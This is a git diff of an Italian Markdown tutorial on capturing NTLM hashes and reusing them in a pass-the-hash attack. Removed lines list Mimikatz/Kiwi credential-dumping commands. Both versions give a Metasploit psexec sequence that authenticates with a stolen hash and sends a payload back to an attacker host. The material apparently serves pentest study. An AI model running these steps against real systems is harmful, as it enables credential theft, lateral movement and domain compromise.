@@ -12,33 +12,24 @@ In ambienti moderni, **LM è disabilitato per default**, ma NTLM continua ad ess
 La capacità di catturare un hash NTLM è quindi fondamentale: esso rappresenta la “firma” digitale della password, e può essere utilizzato per ottenere l’accesso a risorse di rete, spostarsi lateralmente all'interno dell'infrastruttura e perfino compromettere interi domini Active Directory. <br>
 A differenza delle password in chiaro, **gli hash NTLM spesso non vengono ruotati regolarmente** e, una volta ottenuti, **rimangono validi per lunghi periodi**, specialmente se associati ad account amministrativi.
 
-## 1 – Raccolta degli hash con Mimikatz
+## PSExex in Metasploit
 
-Dopo aver ottenuto accesso a una macchina target con privilegi elevati, si può eseguire:
+Dopo aver ottenuto accesso a una macchina target con privilegi elevati, e aver estratto gli hash con Kiwi e Mimikatz, salviamo gli hash ottenuti in un file `hash.txt` in modo da poterli utilizzare piú facilmente.
 
-`load kiwi` carica l'estensione kiwi <br>
-`lsa_dump_sam ` estrae hash SAM + SysKey <br>
-`hashdump` dump degli hash NTLM/LM degli utenti <br>
-
-Salviamo gli hash in un file locale, per esempio `hashes.txt`, in modo da poterli riutilizzare nei passaggi successivi.
-
----
-
-## 2 – Utilizzo dell’hash con Metasploit (PsExec)
-
-`psexec` è un modulo exploit SMB che consente di autenticarsi tramite hash NTLM:
-
-`use exploit/windows/smb/psexec` carica il modulo psexec <br>
-`set RHOST <IP>` IP della macchina target <br>
-`set SMBUser Administrator` utente con hash disponibile <br>
-`set SMBPass <NTLMHash>`# hash dell'utente <br>
-`set LHOST <KaliIP>` IP della macchina di attacco <br>
-`set LPORT <PortDiversa>` porta diversa da quella già in uso <br>
-`set target Native upload` forza l'upload via SMB (default più compatibile) <br>
-`run` <br>
-
-### Perché usare `target Native upload`?
-Questo target è pensato per caricare manualmente il payload via SMB anziché usare metodi alternativi (come Powershell o VBScript) che possono essere bloccati dalle policy. È spesso il metodo più compatibile in ambienti legacy.
+`psexec` è un modulo exploit SMB che consente di autenticarsi tramite hash NTLM senza inserire passwords:
+```bash
+use exploit/windows/smb/psexec
+set RHOST <IP>
+set SMBUser Administrator    # é un utente di cui abbiamo l'hash NTLM
+set SMBPass <NTLMHash>       # inseriamo l'hash dell'utente
+set LHOST <KaliIP>
+set LPORT <PORT>             # porta diversa da quella già in uso da meterpeter
+set target Native upload     # forza l'upload via SMB (default più compatibile)
+run
+```
+>Perché usare **target Native upload**? <br>
+>Questo target è pensato per caricare manualmente il payload via SMB anziché usare metodi alternativi (come Powershell o VBScript) che possono essere bloccati dalle policy.
+>È spesso il metodo più compatibile in ambienti legacy.
 
 ---
 
